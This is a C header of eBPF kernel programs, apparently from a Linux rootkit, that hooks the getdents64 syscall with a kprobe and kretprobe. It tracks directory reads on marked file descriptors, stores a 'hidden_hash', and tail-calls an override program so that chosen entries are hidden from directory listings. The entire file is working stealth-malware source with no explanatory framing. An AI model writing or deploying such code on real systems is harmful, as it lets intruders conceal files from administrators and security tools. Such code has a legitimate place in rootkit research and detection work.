#ifndef __OVERRIDE_DIR_KERN_H
#define __OVERRIDE_DIR_KERN_H

#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "common.h"
#include "hash.h"

SEC("kprobe/__x64_sys_getdents64")
int __x64_sys_getdents64(struct pt_regs *ctx)
{
    ctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    int fd;
    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));

    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_fd_key_t fd_key = {
        .fd = fd,
        .pid = pid_tgid >> 32,
    };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    struct linux_dirent64 *dirent;
    bpf_probe_read(&dirent, sizeof(dirent), &PT_REGS_PARM2(ctx));

    struct rk_getdents_t getdents = {
        .dirent = dirent,
        .hidden_hash = fd_attr->action.hidden_hash,
    };

    bpf_map_update_elem(&rk_getdents, &pid_tgid, &getdents, BPF_ANY);

    return 0;
}

SEC("kretprobe/__x64_sys_getdents64")
int __x64_sys_getdents64_ret(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
    if (!getdents)
        return 0;

    bpf_tail_call(ctx, &rk_progs, OVERRIDE_GET_DENTS_PROG);

    return 0;
}

#endif